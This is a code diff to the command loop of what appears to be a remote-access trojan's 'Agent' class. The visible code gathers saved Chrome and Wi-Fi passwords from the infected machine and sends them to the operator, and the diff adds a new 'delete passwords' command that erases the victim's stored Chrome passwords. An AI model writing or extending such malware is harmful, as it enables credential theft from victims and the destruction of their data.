@@ -325,15 +325,20 @@ class Agent(object):
 
     @threaded
     def passwords(self):
+        # get stored passwords from Chrome
         data = getChromePasswords()
         for dictionary in data:
             for key, value in dictionary.items():
                 self.send_output("%s : %s" % (key, value))
 
+        # get local stored passwords from wifi connections
         data = getWifiPasswords()
         for wifi in data:
             self.send_output(wifi)
 
+    @threaded
+    def deleteStoredPasswords(self):
+        deleteChromePasswords()
 
     def help(self):
         """ Displays the help """
@@ -410,6 +415,8 @@ class Agent(object):
                             self.camshot()
                         elif command == 'passwords':
                             self.passwords()
+                        elif command == 'delete passwords':
+                            self.deleteStoredPasswords()
                         elif command == 'help':
                             self.help()
                         else:
